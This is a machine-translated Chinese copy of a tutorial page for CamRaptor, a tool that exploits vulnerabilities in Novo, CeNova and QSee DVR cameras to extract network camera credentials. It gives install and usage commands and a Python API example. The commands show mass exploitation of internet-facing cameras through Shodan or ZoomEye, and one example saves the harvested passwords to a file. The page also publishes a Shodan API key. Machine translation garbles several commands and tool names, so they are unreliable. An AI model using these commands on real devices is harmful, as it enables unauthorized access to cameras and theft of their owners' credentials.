# CamRaptor:利用流行的 DVR 摄像机中的几个漏洞来获取网络摄像机凭证的工具

> 原文：<https://kalilinuxtutorials.com/camraptor/>

[![CamRaptor : Tool That Exploits Several Vulnerabilities In Popular DVR Cameras To Obtain Network Camera Credentials](img/bb65cfc8bf349538c256544f57d59daa.png "CamRaptor : Tool That Exploits Several Vulnerabilities In Popular DVR Cameras To Obtain Network Camera Credentials")](https://1.bp.blogspot.com/--QeKtiSQ2K0/YN61TRrVXYI/AAAAAAAAJxg/xj1QOjtmFU4_pYQbiZNgrnhDYUNQDqPSgCLcBGAsYHQ/s1011/1%2B%25281%2529.png)

**CamRaptor** 是一个利用流行的 DVR 摄像机中的几个漏洞来获取网络摄像机凭证的工具。

**特性**

*   利用最流行的相机型号中的漏洞，如`**Novo**`、`**CeNova**`和`**QSee**`。
*   经过优化，可在启用线程的情况下同时利用列表中的多个摄像头。
*   简单的 CLI 和 API 用法。

**安装**

**pip3 安装 git+https://github . com/enty sec/cam raptor**

**基本用法**

要使用 CamRaptor，只需在终端中键入`**camraptor**`。

**用法:CamRaptor[-h][-t][-o OUTPUT][-I INPUT][-a ADDRESS]
[–shod an shod an][–zoo meye zoo meye][-p PAGES]
CamRaptor 是一个利用流行的 DVR
摄像机中的几个漏洞来获取网络摄像机凭证的工具。
可选参数:
-h，–help 显示此帮助消息并退出
-t，–线程使用线程进行最快的工作。
-o 输出，–输出输出
输出结果到文件。
-i 输入，–INPUT 输入
输入文件的地址。
-一个地址，–地址地址
单个地址。
–SHODAN SHODAN SHODAN API 密钥，用于通过互联网利用设备。
–用于通过互联网利用设备的 zoomeye ZOOMEYE ZoomEye API 密钥。
-p PAGES，–PAGES PAGES
你想从 ZoomEye 获取的页数。**

**例题**

**利用单个摄像头**

让我们黑了我的相机只是为了好玩。

**cam raptor-a 192 . 168 . 99 . 100**

**利用互联网上的摄像头**

让我们尝试使用 Shodan 搜索引擎来开发互联网上的相机，我们将使用它与`**-t**`快速开发。

**迅猛龙-t-【shodan PSK qe1 gyxggecyz 2191 h2jos 9 qvgd】**

**注:**给定的 Shodan API key **( `PSKINdQe1GyxGgecYz2191H2JoS9qvgD` )** 是我的 PRO API key，你可以使用这个 key 或者你自己的，可以自由的免费使用我们所有的资源。

**利用输入文件中的摄像机**

让我们尝试使用带有`**-t**`的开放式摄像机数据库进行快速开发。

**camraptor-t-I camera s . txt-o passwords . txt**

**注意:**会根据地址利用 **`cameras.txt`** 列表中的所有摄像机，并将获得的所有密码保存到 **`passwords.txt`。**

**API 使用**

CamRaptor 也有自己的 Python API，可以通过将 CamRaptor 导入到代码中来调用。

**从 camraptor 进口 CamRaptor**

**基本功能**

有所有 CamRaptor 的基本功能，可用于开发指定的摄像机。

*   `**exploit(address)**`–利用给定地址的单个摄像头。

**例题**

**利用单个摄像头**

**从 camraptor 导入 cam raptor
cam raptor = cam raptor()
creds = cam raptor . exploit(' 192 . 168 . 99 . 100 ')
print(creds)**

[**Download**](https://github.com/EntySec/CamRaptor)